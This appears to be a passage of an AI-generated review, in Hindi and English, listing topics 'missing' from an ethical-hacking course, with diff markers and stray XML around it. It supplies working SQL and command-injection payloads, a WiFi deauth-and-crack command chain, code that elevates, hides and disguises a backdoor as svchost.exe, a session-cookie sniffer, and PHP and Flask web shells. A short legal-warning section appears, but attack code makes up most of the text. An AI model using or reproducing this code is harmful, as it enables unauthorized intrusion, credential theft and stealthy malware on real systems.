+    http://facebook.com in browser (no lock icon) 6. Victim enters password on
+    HTTP page 7. Attacker sees password in plain text ✓ ``` *** ### **2. Legal &
+    Ethical Considerations** **Status:** COMPLETELY MISSING **Impact:** Students
+    ko pata nahi ki yeh **illegal** hai **Critical Missing Points:** ``` ⚠️
+    WARNING - Legal Consequences: 1. Unauthorized Computer Access (IPC Section
+    66, IT Act 2000) → Punishment: Up to 3 years jail + fine 2. Hacking
+    someone's WiFi: ILLEGAL 3. ARP spoofing on public network: ILLEGAL 4.
+    Creating backdoor for others: ILLEGAL 5. Testing vulnerability scanner on
+    websites without permission: ILLEGAL ✓ LEGAL Ways to Practice: - Own virtual
+    machines - HackTheBox, TryHackMe platforms - Bug bounty programs (with
+    authorization) - DVWA (Damn Vulnerable Web App) ``` **Missing Ethical
+    Guidelines:** ```python # Should be taught: # ✓ Legal Testing if
+    permission_granted and own_system: run_attack() else: print("ILLEGAL! Don't
+    proceed!") # Bug Bounty Example: # 1. Company says "Find vulnerabilities,
+    we'll pay you" # 2. You test their website # 3. Report vulnerability
+    responsibly # 4. Get paid (₹10,000 - ₹10,00,000+) ``` *** ### **3.
+    Vulnerability Scanner - Only XSS (CRITICAL LIMITATION)** **Page Reference:**
+    Pages 110-160 **Problem:** Scanner sirf **XSS** detect karta hai. Baaki **9
+    major vulnerabilities** missing! **Missing Vulnerability Detection:** ####
+    **SQL Injection (Should be Page 156-160):** ```python # Missing
+    implementation: def test_sql_injection(self, url): """Test for SQL injection
+    vulnerability""" sql_payloads = [ "' OR '1'='1", "' OR '1'='1' --", "' OR
+    '1'='1' /*", "admin'--", "1' UNION SELECT NULL--" ] for payload in
+    sql_payloads: test_url = url.replace("=", f"={payload}") response =
+    self.session.get(test_url) # SQL error indicators sql_errors = [ "SQL
+    syntax", "mysql_fetch", "ORA-01756", "Microsoft SQL Server", "ODBC SQL
+    Server Driver" ] for error in sql_errors: if error in response.content:
+    return True return False ``` **Real Example:** ``` Vulnerable URL:
+    http://site.com/product.php?id=1 Attack: http://site.com/product.php?id=1'
+    OR '1'='1 Result: Shows all products (database compromised!) ``` ####
+    **Command Injection (Missing):** ```python def test_command_injection(self,
+    url): """Test for OS command injection""" cmd_payloads = [ "; ls", "| dir",
+    "& whoami", "; cat /etc/passwd" ] for payload in cmd_payloads: test_url =
+    url + payload response = self.session.get(test_url) # Check if command
+    output appears if "root:" in response.content or "Administrator" in
+    response.content: return True return False ``` **Real Example:** ```
+    Vulnerable URL: http://site.com/ping.php?ip=8.8.8.8 Attack:
+    http://site.com/ping.php?ip=8.8.8.8; ls Result: Shows directory listing
+    (server compromised!) ``` *** ## **🔴 HIGH PRIORITY MISSING TOPICS (4
+    Topics)** ### **4. WiFi Attacks (Actual Wireless Hacking)** **Page
+    Reference:** Pages 29-31 (sirf saved passwords steal kiye) **Problem:** Real
+    WiFi hacking nahi sikhaya **Missing WiFi Attack Chain:** ```bash # Complete
+    WiFi Hacking Process (MISSING): # Step 1: Put wireless adapter in monitor
+    mode airmon-ng start wlan0 # Now interface becomes wlan0mon # Step 2: Scan
+    for WiFi networks airodump-ng wlan0mon # Shows all nearby WiFi networks with
+    BSSID, channel, encryption # Step 3: Target specific network and capture
+    handshake airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon #
+    Step 4: Deauth attack (force user to reconnect) aireplay-ng --deauth 10 -a
+    AA:BB:CC:DD:EE:FF wlan0mon # User disconnects and reconnects → handshake
+    captured! # Step 5: Crack the password aircrack-ng -w
+    /usr/share/wordlists/rockyou.txt capture-01.cap ``` **Python Implementation
+    (Missing):** ```python import subprocess def deauth_attack(target_mac,
+    ap_mac, interface): """Disconnect client from WiFi""" command = [
+    "aireplay-ng", "--deauth", "0", # Unlimited deauth packets "-a", ap_mac, #
+    Access Point MAC "-c", target_mac, # Client MAC interface ]
+    subprocess.Popen(command) ``` *** ### **5. Privilege Escalation** **Expected
+    Location:** Pages 90-100 (backdoor section) **Problem:** Backdoor bina admin
+    rights ke **limited capabilities** hai **Missing Windows UAC Bypass:**
+    ```python import ctypes import sys def is_admin(): """Check if running with
+    admin privileges""" try: return ctypes.windll.shell32.IsUserAnAdmin()
+    except: return False def run_as_admin(): """Request admin privileges (UAC
+    prompt)""" if not is_admin(): # Re-run the program with admin request
+    ctypes.windll.shell32.ShellExecuteW( None, "runas", # Run as administrator
+    sys.executable, " ".join(sys.argv), None, 1 ) sys.exit() # Usage in
+    backdoor: if __name__ == "__main__": run_as_admin() # Now backdoor has admin
+    rights! ``` **Why Important:** ``` Without Admin Rights: ❌ Can't install
+    persistence in registry ❌ Can't access system files ❌ Can't disable
+    antivirus ❌ Can't create system-level services With Admin Rights: ✓ Full
+    system control ✓ Can modify registry ✓ Can access all files ✓ Can disable
+    security features ``` *** ### **6. Process Hiding & Stealth** **Expected
+    Location:** After Persistence (Pages 102-105) **Problem:** Backdoor **Task
+    Manager** mein visible hai **Missing Process Hiding Techniques:** ```python
+    import win32gui import win32con def hide_console(): """Hide the console
+    window""" window = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(window, win32con.SW_HIDE) # Add this to backdoor: if
+    __name__ == "__main__": hide_console() # Now backdoor runs invisibly! ```
+    **Rename Process (Disguise as System Process):** ```python import os import
+    sys import shutil # Copy backdoor as system-looking name fake_name =
+    "C:\\Windows\\System32\\svchost.exe" # Looks legitimate
+    shutil.copy(sys.executable, fake_name) # Run the fake one os.system(f"start
+    {fake_name}") sys.exit() ``` *** ### **7. File Upload Vulnerabilities (In
+    Scanner)** **Should be:** Pages 110-160 **Problem:** Very common
+    vulnerability, completely missing from scanner **Missing Implementation:**
+    ```python def test_file_upload(self, url): """Test for unrestricted file
+    upload""" # Create a malicious PHP file malicious_content = "<?php system($_GET['cmd']); ?>"
+    # Try different extensions to bypass filters test_files = [ ("shell.php",
+    malicious_content), ("shell.php.jpg", malicious_content), # Double extension
+    ("shell.pHP", malicious_content), # Case bypass ("shell.php%00.jpg",
+    malicious_content) # Null byte injection ] for filename, content in
+    test_files: files = {'file': (filename, content)} response =
+    self.session.post(url, files=files) if "uploaded successfully" in
+    response.content.lower(): print(f"[!] File upload vulnerability: {filename}
+    accepted!") return True return False ``` *** ## **⚠️ MEDIUM PRIORITY MISSING
+    TOPICS (10 Topics)** ### **8. Port Scanning** **Expected:** Pages 15-17
+    **Missing:** Fundamental reconnaissance technique ```python import socket
+    def port_scan(target, ports): """Scan ports on target""" print(f"Scanning
+    {target}...") for port in ports: sock = socket.socket(socket.AF_INET,
+    socket.SOCK_STREAM) sock.settimeout(1) result = sock.connect_ex((target,
+    port)) if result == 0: print(f"[+] Port {port} OPEN") sock.close() # Common
+    ports common_ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 8080]
+    port_scan("10.0.2.15", common_ports) ``` *** ### **9. Session Hijacking**
+    **Could be added:** Page 25 (with packet sniffer) ```python from scapy.all
+    import * from scapy.layers import http def capture_cookies(packet):
+    """Capture session cookies from HTTP traffic""" if
+    packet.haslayer(http.HTTPRequest): if packet.haslayer(Raw): headers =
+    packet[Raw].load.decode() if "Cookie:" in headers: # Extract cookie
+    cookie_line = [line for line in headers.split('\n') if 'Cookie:' in line]
+    print(f"[+] Captured Cookie: {cookie_line[0]}") sniff(iface="eth0",
+    prn=capture_cookies) ``` *** ### **10. Web Shell** **Should be:** Separate
+    section or with backdoor ```php
+    <!-- Simple PHP Web Shell (should be taught) -->
+    <?php
+if(isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+
+    <!-- Usage: -->
+    <!-- http://victim.com/shell.php?cmd=whoami -->
+    <!-- http://victim.com/shell.php?cmd=ls -la -->
+    ``` **Python Web Shell:** ```python from flask import Flask, request import
+    subprocess app = Flask(__name__) @app.route('/') def web_shell(): cmd =
+    request.args.get('cmd') if cmd: result = subprocess.check_output(cmd,
+    shell=True) return result return "Web Shell Ready" app.run(host='0.0.0.0',
+    port=8080) ``` *** ## **📊 Complete Summary** | **Category** | **First 12
+    Topics** | **Additional 20 Topics** | **Total** |
+    |--------------|---------------------|--------------------------|-----------|
+    | **CRITICAL** | 3 | 3 | **6** | | **HIGH** | 4 | 4 | **8** | | **MEDIUM** |
+    4 | 10 | **14** | | **LOW** | 1 | 3 | **4** | | **TOTAL** | **12** | **20**
+    | **32** | *** ## **🎯 Top 10 Most Critical Missing Topics (Priority
+    Order):** 1. ⚠️ **Legal & Ethical Considerations** - Students ko laws pata
+    hone chahiye 2. 🔒 **Bypassing Antivirus** - Backdoor useless without this
+    3. 🌐 **SSL Stripping/HTTPS Downgrade** - MITM attack incomplete 4. 📡
+    **WiFi Actual Attacks** - Real wireless hacking missing 5. 🔍 **SQL
+    Injection in Scanner** - Most common web vulnerability 6. 🔐 **Persistence
+    (Complete)** - Backdoor temporary without this 7. 📤 **File Upload
+    Vulnerabilities** - Common real-world attack 8. 🎭 **Process Hiding** -
+    Backdoor easily detectable 9. ⬆️ **Privilege Escalation** - Limited
+    capabilities without admin 10. 🔑 **Keylogger (Complete)** - Mentioned but
+    not implemented Yeh saare topics **essential** hain ek complete ethical
+    hacking course ke liye! 🚀
+    [1](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/134266602/1a479207-ba5d-4cd4-b231-742c8810cced/paste.txt)
+  </form></Response
+>
